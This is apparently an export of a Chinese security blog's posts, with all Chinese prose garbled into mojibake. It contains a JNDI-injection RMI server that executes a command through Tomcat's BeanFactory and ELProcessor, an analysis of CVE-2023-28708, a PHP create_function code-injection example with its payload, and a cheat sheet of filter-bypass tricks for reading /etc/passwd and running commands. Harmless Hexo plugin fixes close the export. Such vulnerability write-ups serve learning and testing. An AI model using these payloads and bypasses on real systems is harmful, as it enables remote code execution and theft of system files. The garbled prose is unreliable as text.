java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;el&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/el is working&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±ä¸éœ€è¦åœ¨å®¢æˆ·ç«¯è®¾ç½®<code>System.setProperty(â€œcom.sun.jndi.rmi.object.trustURLCodebaseâ€, â€œtrueâ€);</code>äº†</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ©ç”¨</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>codebase</tag>
        <tag>JDK</tag>
        <tag>JNDIæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-28708 åŸç†å‰–æ</title>
    <url>/archives/5c78cf2.html</url>
    <content><![CDATA[<p>è¿™åº”è¯¥ä¸æ˜¯ä¸€ä¸ªä¸¥é‡çš„æ¼æ´ï¼Œå¯èƒ½è¯„åˆ†åªèƒ½ä¸ºä½ï¼Œå› ä¸ºå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚<br>è¯ä¸å¤šè¯´ï¼Œç›´æ¥è¿›å…¥æ­£é¢˜</p>
<p>æˆ‘çš„å¤ç°ç¯å¢ƒï¼š<br>tomcat-8.5.50</p>
<p>é¦–å…ˆæˆ‘ä»¬å¾—ç®€å•å†™ä¸€ä¸ªservletï¼Œå½“ç„¶ä¸å†™ä¹Ÿæ²¡äº‹ï¼Œå› ä¸ºæˆ‘ä»¬çš„åˆ†æåˆ°ä¸äº†å¤„ç†servletè¿™ä¸€æ­¥ï¼Œåªç”¨tomcaté»˜è®¤æä¾›çš„ROOTå°±è¡Œ</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨web.xmlä¸­æ³¨å†Œ RemoteIpFilter è¿™ä¸ªè¿‡æ»¤å™¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>remote-ip-filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.catalina.filters.RemoteIpFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>remote-ip-filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæŠŠtomcatå¯åŠ¨èµ·æ¥ï¼Œæ‰“æ–­ç‚¹è°ƒè¯•ï¼Œå› ä¸ºé—®é¢˜æ˜¯å‡ºåœ¨<code>X-Forwarded-Proto</code>è¿™ä¸ªHTTPæ ‡å¤´ï¼Œæˆ‘ä»¬å°±åœ¨<code>RemoteIpFilter</code>è¿™ä¸ªæ–‡ä»¶ä¸­æœç´¢è¯¥å…³é”®å­—<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8fccc156174026ce6ffe38387554d8d2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a0a9c8269fc8630579509ed1a647dbf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6aac723742f1e1fbfe535979647d4d61.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœè·å–åˆ°<code>X-Forwarded-Proto</code> å¹¶ä¸”å…¶å€¼ä¸ºhttpså°±è®¾ç½®Secureå±æ€§ä¸ºTrueï¼Œè¿™ä¸ªå±æ€§æœ€ç»ˆå°±ä½“ç°åœ¨cookieä¸Šï¼Œæˆ‘ä»¬å‡è®¾ä¸€ç§æƒ…å†µï¼Œå½“åä»£æœåŠ¡å™¨ä¸æä¾›æœåŠ¡çš„æœåŠ¡å™¨ä¹‹é—´ä½¿ç”¨httpé€šä¿¡æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œå› ä¸ºåä»£æœåŠ¡å™¨è®¾ç½®äº†<code>X-Forwarded-Proto: https</code>ï¼ŒæœåŠ¡æä¾›è€…ä¼šå°†è¯·æ±‚çš„secureå±æ€§è®¾ç½®ä¸ºTrueå¯¼è‡´è¢«è®¾ç½®äº†secureçš„cookieè¢«é€šè¿‡httpä¼ è¾“ï¼Œä»è€Œä½¿çš„cookieå­˜åœ¨è¢«åŠ«æŒçš„å¯èƒ½ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/69bd4dbb8fa769e97a28745b0cbffeaf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å‡ ä¹å°±æ˜¯è¿™ä¸ªæ¼æ´çš„å…¨éƒ¨<br>æˆ‘ä»¬çœ‹çœ‹å®˜æ–¹çš„ä¿®å¤commit<br><a href="https://github.com/apache/tomcat/commit/c64d496dda1560b5df113be55fbfaefec349b50f#diff-9c316c073cfa58d2e1d10f6b11760fbd2c14e478376c92b36e10a21235bb449bR766">Fix BZ 66471 - JSessionId secure attribute missing with RemoteIpFilteâ€¦</a></p>
<p>è€å®è¯´ä»–è¿™ä¸ªä¿®å¤æ–¹æ³•æˆ‘æ²¡å¤ªçœ‹æ‡‚<br>ä¿®æ”¹äº†<code>setSecure</code>æ–¹æ³•ï¼Œè·å–äº†<code>request</code>å¯¹è±¡ï¼Œä¿®æ”¹åè·å–çš„<code>request</code>åº”è¯¥å’Œä¿®æ”¹å‰ä¸ä¸€æ ·ï¼Œä¿®æ”¹å‰è·å–çš„æ˜¯<code>XForwardedRequest</code>å¯¹è±¡ï¼Œä¿®æ”¹ååº”è¯¥æ˜¯åŸå§‹çš„<code>ServletRequest</code>å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè®¾ç½®<code>secure</code>å±æ€§å¹¶æ²¡æœ‰ä¿®æ”¹åˆ°<code>XRequest</code>å¯¹è±¡çš„secureå€¼ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå¯¹è½¬å‘è¯·æ±‚é€ æˆå½±å“ï¼Œä»è€Œå®Œæˆä¿®å¤<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fcb4252b0f33f77a916761385b40ee35.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨è¯¥commité‡Œè¿˜åŠ äº†ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e14900826002dd9dd055128cd6a96538.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœèƒ½å¯¹è¯¥æµ‹è¯•ç”¨ä¾‹æœ‰è¶³å¤Ÿçš„ç†è§£ï¼Œç†è§£è¯¥æ¼æ´åº”è¯¥ä¸éš¾</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>CVE-2023-28708</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç æ‰§è¡Œ</title>
    <url>/archives/d5b96b72.html</url>
    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>å¯ä»¥æ³¨å…¥PHPä»£ç ç›´æ¥æ‰§è¡Œçš„æ¼æ´</p>
<p>ä¸€èˆ¬éƒ½æ˜¯åå°ä½¿ç”¨äº†eval å‡½æ•°ï¼Œå°†æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥ä½œä¸ºevalå‡½æ•°çš„å‚æ•°ï¼Œä»è€Œæ˜¯çš„æ¶æ„çš„å‘½ä»¤è¢«æ‰§è¡Œ</p>
<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>createä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“</p>
<p><code>create_function(args,code)</code> è¿”å›å›ä¸ªå‡½æ•°åå­—ç¬¦ä¸²</p>
<p>å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>

<p>å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**æ¡ˆä¾‹ä¸€ï¼š**æ¼æ´ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p>è¿˜åŸæ‰§è¡Œè¿‡ç¨‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p>åŒ¿åå‡½æ•°æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;å°†å‚æ•°ä¼ å…¥å‡½æ•°ï¼Œå¯ä¼ å¤šä¸ª</p>
<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;å°†ç´¢å¼•æ•°ç»„çš„å…ƒç´ ä½œä¸ºå‡½æ•°çš„å‚æ•°</p>
<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
<p>array_filter</p>
<p>array_walk</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>ä»£ç æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPå‘½ä»¤æ‰§è¡Œ</title>
    <url>/archives/96914696.html</url>
    <content><![CDATA[<h1 id="RCEæ¼æ´"><a href="#RCEæ¼æ´" class="headerlink" title="RCEæ¼æ´"></a>RCEæ¼æ´</h1><p>æœåŠ¡å™¨æä¾›äº†æ‰§è¡Œæœ‰é™å‘½ä»¤çš„æƒé™ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·ä¸Šä¼ çš„å‚æ•°åšä¸¥æ ¼è¿‡æ»¤ï¼Œäºæ˜¯å¯é€šè¿‡ä¸€äº›æ‰‹æ®µæ‰§è¡Œå¤šæ¡å‘½ä»¤</p>
<h2 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><p>exec() &#x2F;&#x2F;å¿…é¡»ä½¿ç”¨echoè¾“å‡ºï¼Œåªè¾“å‡ºæœ€åä¸€è¡Œ</p>
<p>shell_exec() &#x2F;&#x2F;å¿…é¡»ä½¿ç”¨echoè¾“å‡º</p>
<p>system()</p>
<p>popen()</p>
<p>åå•å¼•å· å¿…é¡»echo</p>
<p>obstart</p>
<p>mail+LD_RELOAD</p>
<p>proc_open</p>
<p>passthru</p>
<p>xssä¸­å¯ä»¥ä½¿ç”¨&#96;&#96;ä»£æ›¿æ‹¬å· alert<code>123</code></p>
<p>sqlæ³¨å…¥è¯¸å¦‚ä¸­å¯ä»¥ä½¿ç”¨&#96;&#96;select<code>$_GET[name]</code> from table</p>
<h2 id="æ‰§è¡Œæ–¹å¼"><a href="#æ‰§è¡Œæ–¹å¼" class="headerlink" title="æ‰§è¡Œæ–¹å¼"></a>æ‰§è¡Œæ–¹å¼</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h3><p>| ä¸æ–­è·¯</p>
<p>|| çŸ­è·¯</p>
<p>&amp;&amp; çŸ­è·¯</p>
<p>&amp; ä¸æ–­è·¯</p>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>; åˆ†å‰²ä¸åŒçš„å‘½ä»¤</p>
<h2 id="è¿‡æ»¤å‡½æ•°"><a href="#è¿‡æ»¤å‡½æ•°" class="headerlink" title="è¿‡æ»¤å‡½æ•°"></a>è¿‡æ»¤å‡½æ•°</h2><p>shell_code</p>
<h2 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h2><p><strong>å…³é”®å­—è¿‡æ»¤</strong></p>
<p>ä½¿ç”¨åæ–œçº¿ã€å•å¼•å·ã€å˜é‡æ‹¼æ¥ã€base64ç¼–ç </p>
<p><code>ca\t$IFS/etc/passw&#39;o&#39;r\d</code> &#x2F;&#x2F;èƒ½æ­£å¸¸æ‰§è¡Œ å¿…é¡»è·Ÿç»å¯¹è·¯åŠ²</p>
<p><code>a=&#39;l&#39;;b=&#39;s&#39;;$a$b</code></p>
<p><code>echo d2hvYW1p | base64 -d</code> &#x2F;&#x2F;base64</p>
<p><code>echo &quot;0x636174202f6574632f706173737764&quot; | xxd -r -p | bash</code> &#x2F;&#x2F;åå…­è¿›åˆ¶</p>
<p><code>$(printf &quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;)</code> &#x2F;&#x2F;åå…­è¿›åˆ¶</p>
<p><em>k</em>â€„&#x3D;â€„â€²<em>dd</em>â€²;{IFS}${9}{n\l,&#x2F;etc$kkkkkkk$kkkkd&#x2F;paâ€™sâ€™sddks&#96;&#96;}</p>
<p><strong>æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡</strong></p>
<p>ä½¿ç”¨é€šé…ç¬¦</p>
<p><code>cat /???/passw*</code></p>
<p>ä½¿ç”¨æœªå£°æ˜çš„å˜é‡</p>
<p><code>cat /etc$u/passwd</code></p>
<p>ä½¿ç”¨é€šé…</p>
<p><code>cat /etc/pass[sdfkew]d</code></p>
<p>ä½¿ç”¨cdå‘½ä»¤ç›®å½•ç©¿è¶Š</p>
<p><code>cd+..%26%26cd+..%26%26cd+..%26%26cd+..%26%26cd+etc%26%26cat+passwd</code></p>
<p>windowsç³»ç»Ÿ</p>
<p><code>((whoa^m&quot;&quot;i))</code></p>
<p>å˜é‡æ‹¼æ¥ï¼š</p>
<p><code>Whoami = a=who&amp;&amp;b=ami&amp;&amp;$a$b</code></p>
<p>ä¸­é—´ä»¶å‘½ä»¤æ‰§è¡Œä½¿ç”¨æ›¿ä»£å‡½æ•°</p>
<p><code>phpinfo() = chr (80).chr (72).chr (80).chr (73).chr (78).chr (70).chr (79).chr (40).chr (41)</code></p>
<p><code>base_convert(27440799224,10,32)();</code></p>
<p><strong>catçš„æ›¿ä»£å‘½ä»¤</strong>ï¼š</p>
<p><code>cat more less head tac nl od vi vim uniq file -f sort bash -v  rev  strings curl file:///etc/passwd</code></p>
<p>find è¯»å–ç›®å½•</p>
<p><strong>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</strong></p>
<p><code>$IFS $IFS$9 $&#123;IFS&#125;&#123;cat,/etc/passwd&#125;</code></p>
<p><strong>è¿æ¥ç¬¦è¿‡æ»¤</strong></p>
<p><code>&amp; | ; %0a</code>ç­‰è¿æ¥ç¬¦ æŒ¨ä¸ªå°è¯•</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£å†³hexoå›¾ç‰‡è®¿é—®é‡åˆ°å›¾åºŠé˜²ç›—é“¾æ— æ³•è®¿é—®çš„é—®é¢˜</title>
    <url>/archives/53e2963.html</url>
    <content><![CDATA[<p>æˆ‘çš„<code>hexo</code>ä½¿ç”¨çš„æ—¶<code>hexo-renderer-marked</code>æ¸²æŸ“å¼•æ“ï¼Œåœ¨è¯¥å¼•æ“çš„<code>lib/renderer.js</code>æ–‡ä»¶ä¸­æœç´¢<code>img</code>å…³é”®å­—  æ·»åŠ æ ‡ç­¾å±æ€§<code>referrerpolicy=&quot;no-referrer&quot;</code>å³å¯</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">image</span>(<span class="params">&#123; href, title, text &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; options &#125; = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; hexo &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> &#123; relative_link &#125; = hexo.<span class="property">config</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; lazyload, figcaption, prependRoot, postPath &#125; = options;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(#|\/\/|http(s)?:)/</span>.<span class="title function_">test</span>(href) &amp;&amp; !relative_link &amp;&amp; prependRoot) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!href.<span class="title function_">startsWith</span>(<span class="string">&#x27;/&#x27;</span>) &amp;&amp; !href.<span class="title function_">startsWith</span>(<span class="string">&#x27;\\&#x27;</span>) &amp;&amp; postPath) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">PostAsset</span> = hexo.<span class="title function_">model</span>(<span class="string">&#x27;PostAsset&#x27;</span>);</span><br><span class="line">        <span class="comment">// findById requires forward slash</span></span><br><span class="line">        <span class="keyword">const</span> asset = <span class="title class_">PostAsset</span>.<span class="title function_">findById</span>(<span class="title function_">join</span>(postPath, href.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)));</span><br><span class="line">        <span class="comment">// asset.path is backward slash in Windows</span></span><br><span class="line">        <span class="keyword">if</span> (asset) href = asset.<span class="property">path</span>.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      href = url_for.<span class="title function_">call</span>(hexo, href);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> out = <span class="string">`&lt;img src=&quot;<span class="subst">$&#123;encodeURL(href)&#125;</span>&quot; referrerpolicy=&quot;no-referrer&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (text) out += <span class="string">` alt=&quot;<span class="subst">$&#123;<span class="built_in">escape</span>(text)&#125;</span>&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (title) out += <span class="string">` title=&quot;<span class="subst">$&#123;<span class="built_in">escape</span>(title)&#125;</span>&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (lazyload) out += <span class="string">&#x27; loading=&quot;lazy&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    out += <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (figcaption &amp;&amp; text) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`&lt;figure&gt;<span class="subst">$&#123;out&#125;</span>&lt;figcaption aria-hidden=&quot;true&quot;&gt;<span class="subst">$&#123;text&#125;</span>&lt;/figcaption&gt;&lt;/figure&gt;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bugä¿®å¤</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-renderer-marked</tag>
        <tag>å›¾åºŠ</tag>
        <tag>é˜²ç›—é“¾</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£å†³hexo-pdfæ— æ³•ä½¿ç”¨çš„é—®é¢˜</title>
    <url>/archives/e9ccef3c.html</url>
    <content><![CDATA[<p>ä¸‹è½½<code>hexo-pdf</code>åï¼Œä¿®æ”¹<code>index.js</code>ä¸­çš„ä»£ç å°†<code>tag</code>åä¿®æ”¹ä¸ºé<code>pdf</code>å³å¯<br>æˆ‘è¿™é‡Œä¿®æ”¹ä¸º<code>pdfpath</code><br>ä¹‹å‰ä¿®æ”¹ä¸º<code>pdf-path</code>ä¹Ÿä¸èƒ½æ­£å¸¸è¿è¡Œï¼Œpdfåº”è¯¥æ—¶ä¸èƒ½å•ç‹¬å‡ºç°çš„</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* hexo-pdf</span></span><br><span class="line"><span class="comment">* https://github.com/superalsrk/hexo-pdf.git</span></span><br><span class="line"><span class="comment">* Copyright (c) 2015, superalsrk</span></span><br><span class="line"><span class="comment">* Licensed under the MIT license.</span></span><br><span class="line"><span class="comment">* Syntax:</span></span><br><span class="line"><span class="comment">* &#123;% pdf http://yourdoman.com/x.pdf %&#125; %&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>),</span><br><span class="line">    path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>),</span><br><span class="line">    fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">tag</span>.<span class="title function_">register</span>(<span class="string">&#x27;pdfpath&#x27;</span>, <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlTmlSrc = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;reader.ejs&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> htmlTml = ejs.<span class="title function_">compile</span>(fs.<span class="title function_">readFileSync</span>(htmlTmlSrc, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> type = <span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> pdfLink = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;.pdf&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;normal&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;drive.google.com&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;googledoc&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(pdfLink.<span class="title function_">indexOf</span>(<span class="string">&#x27;www.slideshare.net&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  	type = <span class="string">&#x27;slideshare&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">htmlTml</span>(&#123;<span class="string">&quot;src&quot;</span>: args[<span class="number">0</span>], <span class="string">&quot;type&quot;</span> : type&#125;);</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bugä¿®å¤</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-pdf</tag>
      </tags>
  </entry>
  <entry>
    <title>LDAP-è½»é‡çº§ç›®å½•è®¿é—®åè®®</title>
    <url>/archives/abb3a32f.html</url>
    <content><![CDATA[<!--<embed src="./LDAP-è½»é‡çº§ç›®å½•è®¿é—®åè®®.pdf" width="100%" height="750", type="application/pdf">-->



	<div class="row">
    <embed src="LDAP-è½»é‡çº§ç›®å½•è®¿é—®åè®®.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>ldap</tag>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS-LLMNR-MDNS-NBNSåŸç†</title>
    <url>/archives/9c52be10.html</url>
